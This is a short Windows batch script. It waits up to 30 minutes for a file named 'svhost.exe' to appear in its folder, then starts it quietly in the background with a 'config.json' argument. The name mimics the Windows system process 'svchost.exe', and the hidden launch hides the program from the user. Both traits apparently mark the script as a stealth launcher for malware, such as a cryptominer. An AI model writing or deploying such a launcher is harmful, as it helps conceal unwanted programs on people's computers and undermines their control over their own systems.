@echo off
setlocal
:: Switch to the folder where this batch file is located
cd /d "%~dp0"

set "max_checks=15"
set "counter=0"

:CHECK_LOOP
:: Check if svhost.exe exists in the current folder
if exist "svhost.exe" (
    goto START_APP
)

:: Increment counter and check if 30 minutes (15 * 2 mins) have passed
set /a "counter+=1"
if %counter% GEQ %max_checks% (
    goto :EOF
)

:: Wait 2 minutes (120 seconds) before checking again
timeout /t 120 /nobreak >nul
goto CHECK_LOOP

:START_APP
:: Start svhost.exe quietly in the background without creating a taskbar window
start /b "" "svhost.exe" -c "config.json"
endlocal
exit /b
